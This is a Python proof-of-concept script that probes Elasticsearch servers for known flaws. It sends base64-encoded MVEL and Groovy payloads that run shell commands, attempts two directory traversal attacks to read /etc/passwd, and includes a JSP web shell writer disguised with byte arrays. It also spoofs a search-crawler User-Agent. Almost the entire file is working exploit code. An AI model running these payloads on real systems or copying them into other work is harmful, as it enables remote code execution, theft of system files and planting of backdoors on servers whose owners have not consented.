#! /usr/bin/env python
# -*-coding:utf-8-*-


import re
import json
import base64
import requests

header = {"Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}


patterns=['\"okokok\":\["(.*?)"\]','"okokok" : \[ \[ "(.*?)" \]']

def es_mvel(url):
    verify='''c291cmNlPXsic2l6ZSI6MSwicXVlcnkiOnsiZmlsdGVyZWQiOnsicXVlcnkiOnsibWF0Y2hfYWxsIjp7fX19fSwic2NyaXB0X2ZpZWxkcyI6eyJva29rb2siOnsic2NyaXB0IjoiaW1wb3J0IGphdmEudXRpbC4qO1xuaW1wb3J0IGphdmEuaW8uKjtcblN0cmluZyBzdHIgPSBcIlwiO0J1ZmZlcmVkUmVhZGVyIGJyID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKFwid2hvYW1pXCIpLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoKTt3aGlsZSgoc3RyPWJyLnJlYWRMaW5lKCkpIT1udWxsKXtzYi5hcHBlbmQoc3RyIFwiXHJcblwiKTt9c2IudG9TdHJpbmcoKTsifX19'''
    query=url+'/_search'
    try:
        req=requests.get(url=query,params=base64.b64decode(verify),headers=header,timeout=10)
        for pattern in patterns:
            result= re.findall(re.compile(pattern),req.content)
            if result:
                return {'es_mvel':[url,result[0]]}
        return False
    except BaseException as e:
        return False



def es_groovy(url):
    verify='''eyJzaXplIjoxLCJzY3JpcHRfZmllbGRzIjogeyJva29rb2siOiB7InNjcmlwdCI6ImphdmEubGFuZy5NYXRoLmNsYXNzLmZvck5hbWUoXCJqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyXCIpLmdldENvbnN0cnVjdG9yKGphdmEuaW8uUmVhZGVyLmNsYXNzKS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuTWF0aC5jbGFzcy5mb3JOYW1lKFwiamF2YS5pby5JbnB1dFN0cmVhbVJlYWRlclwiKS5nZXRDb25zdHJ1Y3RvcihqYXZhLmlvLklucHV0U3RyZWFtLmNsYXNzKS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuTWF0aC5jbGFzcy5mb3JOYW1lKFwiamF2YS5sYW5nLlJ1bnRpbWVcIikuZ2V0UnVudGltZSgpLmV4ZWMoXCJ3aG9hbWlcIikuZ2V0SW5wdXRTdHJlYW0oKSkpLnJlYWRMaW5lcygpIiwibGFuZyI6ICJncm9vdnkifX19'''
    query = url + '/_search?pretty'
    try:
        req=requests.post(url=query,data=base64.b64decode(verify),headers=header,timeout=10)
        for pattern in patterns:
            result= re.findall(re.compile(pattern),req.content)
            if result:
                return {'es_groovy':[url,result[0]]}
        return False
    except BaseException as e:
        return False


def directory_traversal(url):
    query = url + '/_plugin/head/../../../../../../../../../etc/passwd'
    try:
        req=requests.get(url=query,headers=header,timeout=10)
        if 'root:x:0' in req.content:
            return query
        return False
    except BaseException as e:
        return False



def new_directory_traversal(url):
    repository_query = url + '/_snapshot/test'
    repository = '{"type": "fs","settings":{"location":"/usr/share/elasticsearch/repo/test"}}'
    snapshot = 'eyJ0eXBlIjogImZzIiwic2V0dGluZ3MiOiB7ImxvY2F0aW9uIjogIi91c3Ivc2hhcmUvZWxhc3RpY3NlYXJjaC9yZXBvL3Rlc3Qvc25hcHNob3QtYmFja2RhdGEifX0='
    snapshot_query = url + '/_snapshot/test1'
    query= url + '/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
    try:
        repository_req = requests.post(url=repository_query, data=repository, headers=header, timeout=10)
        if repository_req.ok:
            snapshot_req = requests.put(url=snapshot_query, data=base64.b64decode(snapshot), headers=header, timeout=10)
            if snapshot_req.ok:
                result_req = requests.get(url=query, headers=header, timeout=10)
                if '[114, 111, 111,' in result_req.content:
                    return result_req.url
    except BaseException as e:
        return False
    return False


def es_getshell(url):
    document='''{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}'''


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    info={}
    elasticsearch_mvel= es_mvel(url)
    elasticsearch_groovy= es_groovy(url)
    elasticsearch_dt =directory_traversal(url)
    es_directory_traversal=new_directory_traversal(url)
    if elasticsearch_mvel:
        info.update({"es_mvel": elasticsearch_mvel})
    if elasticsearch_groovy:
        info.update({"es_groovy": elasticsearch_groovy})
    if elasticsearch_dt:
        info.update({"directory_traversal": elasticsearch_dt})
    if es_directory_traversal:
        info.update({"new_directory_traversal": es_directory_traversal})
    if len(info)>0:
        return json.dumps(info,indent=2)
    else:
        return False



if __name__ == '__main__':
    print new_directory_traversal('http://192.168.55.1:9200')